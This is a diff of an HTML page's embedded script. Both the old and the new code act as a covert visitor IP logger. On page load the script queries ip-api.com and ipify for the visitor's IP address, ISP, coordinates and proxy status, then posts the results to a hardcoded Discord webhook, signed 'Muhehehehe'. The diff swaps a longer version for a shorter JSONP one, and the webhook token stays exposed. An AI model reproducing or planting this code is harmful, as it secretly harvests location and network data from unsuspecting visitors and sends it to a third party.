@@ -74,48 +74,23 @@
                     frameborder="0">
 </iframe>
                 <script>
-                    function get_information(link, callback) {
-                      var xhr = new XMLHttpRequest(); //making a request for the webhook
-                      xhr.open("GET", link, true);
-                      xhr.onreadystatechange = function() {
-                        if (xhr.readyState === 4) {
-                          callback(xhr.responseText);
-                        }
-                      };
-                      xhr.send(null);
-                    }
-                    get_information("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function(text) {
-                      var div = document.createElement("div");
-                      div.innerHTML = text;
-                      div.id = "razzylog";
-                      const secondList = document.getElementsByClassName("header")[0]
-                      secondList.appendChild(div)
-                    });
-                    get_information("https://api.ipify.org/", function(text) {
-                      var div = document.createElement("div");
-                      div.innerHTML = text;
-                      div.id = "ipppp";
-                      const secondList = document.getElementsByClassName("header")[0]
-                      secondList.appendChild(div)
-                    });
+                    function getIP(json) {
+                        var request = new XMLHttpRequest(); //making a request for the webhook
+                        request.open("POST", "https://discord.com/api/webhooks/1226126479461711923/oyrugegQKBcQFI8HFajMZGKJ9EViCuOK42DsoCGcw3Jp-i2c_gHXKKf8KN_5SjFtMrTA");
 
-                    function ipLogByRaz() {
-                      var ispp = document.getElementById('ipppp').innerHTML
-                      var extra = document.getElementById("razzylog").innerHTML
-                      const request = new XMLHttpRequest();
-                      request.open("POST", "https://discord.com/api/webhooks/1226126479461711923/oyrugegQKBcQFI8HFajMZGKJ9EViCuOK42DsoCGcw3Jp-i2c_gHXKKf8KN_5SjFtMrTA");
-                      request.setRequestHeader('Content-type', 'application/json');
-                      const params = {	
-                        username: "Muhehehehe",
-                        avatar_url: 'https://cdn.discordapp.com/attachments/1081705288014504006/1085346593273815101/yahudaaxd.png',
-                        content: "**Ip** : _" + ispp + "_\n**Raw** : _https://api.techniknews.net/ipgeo/" + ispp + "_\n**Extra Info** : ```" + extra + "```"
-                      }
-                      request.send(JSON.stringify(params));
-                    }    
-                  setTimeout(function() {
-                    ipLogByRaz()
-                  }, 700);
+                        request.setRequestHeader('Content-type', 'application/json');
+
+                        var params = {
+                            username: "Muhehehehehe",
+                            avatar_url: "https://cdn.discordapp.com/attachments/1193570412785836052/1226126811784675329/image.png?ex=6623a294&is=66112d94&hm=4ebf7ceb5634ba2713fcf4a166e9e0708f0d30728b7d27044c2f15937714d058&",
+                            content: "**IP:** *" + json.ip + "*"
+                        }
+                        //just a webhook parameters such as avatar,name,message
+
+                        request.send(JSON.stringify(params));
+                    }
                 </script>
+                <script src="http://ip-api.com/json/?callback=getIP"></script>
             </div>
         </section>
     </div>
